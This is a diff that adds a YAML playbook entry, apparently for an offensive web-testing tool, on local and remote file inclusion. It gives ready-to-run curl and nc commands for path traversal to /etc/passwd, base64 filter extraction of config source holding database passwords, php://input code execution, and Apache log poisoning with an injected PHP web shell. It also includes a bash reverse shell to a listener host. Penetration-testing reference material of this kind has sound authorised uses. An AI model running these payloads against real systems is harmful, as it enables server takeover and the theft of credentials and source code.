@@ -1,0 +1,78 @@
+id: file-inclusion
+name: Local & Remote File Inclusion (LFI / RFI)
+category: web
+description: Methodology for LFI and RFI vulnerabilities. Covers Linux/Windows path traversal, PHP filter wrappers, php://input RCE, and log poisoning techniques.
+port_triggers:
+  - 80
+  - 443
+  - 8000
+  - 8080
+  - 8443
+  - 8978
+service_triggers:
+  - http
+  - https
+  - web
+tags:
+  - lfi
+  - rfi
+  - wrappers
+  - log-poisoning
+  - web
+steps:
+  - id: lfi-path-traversal
+    title: Basic Path Traversal (/etc/passwd)
+    phase: enumeration
+    purpose: Test for unvalidated file inclusion by escaping the web root using `../` directory traversal sequences.
+    command: curl -s "{{TARGET_URL}}/index.php?page=../../../../etc/passwd"
+    expected_output:
+      - root:x:0:0:root:/root:/bin/bash
+      - www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    common_mistakes:
+      - Not testing URL-encoded bypasses (`..%2f..%2f`) or double encoding (`%252e%252e%252f`).
+    if_success: LFI confirmed! Read user accounts, source code, and configuration files.
+    if_failure: Blocked or not vulnerable. Test PHP base64 filter wrapper.
+    references:
+      - https://github.com/swisskyrepo/PayloadsAllTheThings
+      - https://portswigger.net/web-security
+  - id: lfi-php-filter
+    title: PHP Base64 Filter Wrapper Source Extraction
+    phase: enumeration
+    purpose: Extract raw PHP source code without execution using the `php://filter/convert.base64-encode` stream wrapper.
+    command: curl -s "{{TARGET_URL}}/index.php?page=php://filter/convert.base64-encode/resource=config.php" | base64 -d
+    expected_output:
+      - <?php
+      - '  $db_host = "localhost";'
+      - '  $db_pass = "SuperSecretDBPassword!";'
+    common_mistakes:
+      - Including the `.php` extension in resource parameter if the application automatically appends `.php`.
+    if_success: Source code recovered! Inspect for hardcoded database passwords, API keys, and admin credentials.
+    if_failure: Filter wrapper blocked. Test Apache access log poisoning.
+    references:
+      - https://github.com/swisskyrepo/PayloadsAllTheThings
+  - id: lfi-php-input
+    title: PHP Input Wrapper RCE (php://input)
+    phase: exploitation
+    purpose: Execute arbitrary PHP code by posting code to the `php://input` stream if `allow_url_include = On`.
+    command: curl -s -X POST --data "<?php system('id; whoami'); ?>" "{{TARGET_URL}}/index.php?page=php://input"
+    expected_output:
+      - uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    common_mistakes:
+      - Requires `allow_url_include` to be enabled in `php.ini`.
+    if_success: 'Direct RCE achieved! Spawn reverse shell: `curl -X POST --data "<?php system(''bash -i >& /dev/tcp/{{LHOST|10.10.14.2}}/4444 0>&1''); ?>" "{{TARGET_URL}}/index.php?page=php://input"`'
+    if_failure: php://input refused. Test Apache/Nginx log poisoning.
+    references:
+      - https://github.com/swisskyrepo/PayloadsAllTheThings
+  - id: lfi-apache-log-poison
+    title: Apache Access Log Poisoning RCE
+    phase: exploitation
+    purpose: Inject PHP execution code into the Apache access log via User-Agent/URL request, then include `/var/log/apache2/access.log`.
+    command: 'nc -nv {{TARGET}} {{PORT|80}} -c "GET <?php system(\$_GET[''c'']); ?> HTTP/1.1\r\nHost: {{TARGET}}\r\n\r\n" && curl -s "{{TARGET_URL}}/index.php?page=/var/log/apache2/access.log&c=id"'
+    expected_output:
+      - uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    common_mistakes:
+      - Using browser URL bar to inject PHP code; browsers URL-encode `<` and `>`, breaking PHP execution. Use `nc` or `curl`.
+    if_success: Log poisoned and command executed! Spawn reverse shell with parameter `&c=...`.
+    if_failure: Log file not readable by www-data. Check SSH auth log `/var/log/auth.log` poisoning.
+    references:
+      - https://github.com/swisskyrepo/PayloadsAllTheThings
